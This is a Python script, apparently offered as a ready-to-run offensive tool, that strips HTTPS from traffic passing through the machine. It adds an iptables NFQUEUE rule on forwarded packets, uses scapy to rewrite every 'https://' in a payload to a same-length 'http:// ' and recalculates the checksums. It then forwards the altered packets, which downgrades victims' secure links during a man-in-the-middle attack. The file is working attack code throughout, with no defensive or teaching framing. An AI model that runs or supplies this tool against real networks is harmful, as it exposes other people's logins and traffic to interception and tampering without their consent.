import netfilterqueue
import scapy.all as scapy
import logging
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class SSLStripper:
    DEFAULT_QUEUE_NUM = 0

    def __init__(self, queue_num: int = DEFAULT_QUEUE_NUM):
        self.queue_num = queue_num

    def enable_netfilterqueue(self) -> None:
        """ Directs traffic to the NFQUEUE for processing """
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        logging.info("Iptables rule added: Redirecting traffic to queue")

    def disable_netfilterqueue(self) -> None:
        """ Removes the iptables rule """
        os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        logging.info("Iptables rule removed")

    def process_packet(self, packet):
        try:
            # Convert Netfilter packet to Scapy packet
            scapy_packet = scapy.IP(packet.get_payload())

            if scapy_packet.haslayer(scapy.Raw):
                # Decode payload (ignore errors for binary data like images)
                load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')

                if "https://" in load:
                    logging.info(f"[!] HTTPS detected in packet from {scapy_packet[scapy.IP].src}")

                    # ========================================================
                    # [HACK] Replace 'https://' with 'http:// ' (space added)
                    # This keeps the payload length IDENTICAL (8 bytes).
                    # Prevents TCP Sequence/Ack mismatch and connection drops.
                    # ========================================================
                    new_load = load.replace("https://", "http:// ")

                    # Update payload
                    scapy_packet[scapy.Raw].load = new_load
                    
                    # Delete checksums and length so Scapy recalculates them
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum

                    # Set the modified payload back to the Netfilter packet
                    packet.set_payload(bytes(scapy_packet))
                    
                    logging.info(f"[+] STRIPPED: 'https://' -> 'http:// '")

            # Forward the packet (modified or original)
            packet.accept()
            
        except Exception as e:
            logging.error(f"Error processing packet: {e}")
            packet.accept()

    def run(self):
        logging.info("Starting SSL Stripper...")
        queue = netfilterqueue.NetfilterQueue()
        
        # Cleanup first just in case
        self.disable_netfilterqueue()

        try:
            self.enable_netfilterqueue()
            queue.bind(self.queue_num, self.process_packet)
            logging.info("[*] Listening for packets...")
            queue.run()
        except KeyboardInterrupt:
            logging.info("\nStopping...")
        except Exception as e:
            logging.error(f"Error: {e}")
        finally:
            self.disable_netfilterqueue()
            logging.info("Exiting cleanly.")

if __name__ == '__main__':
    stripper = SSLStripper()
    stripper.run()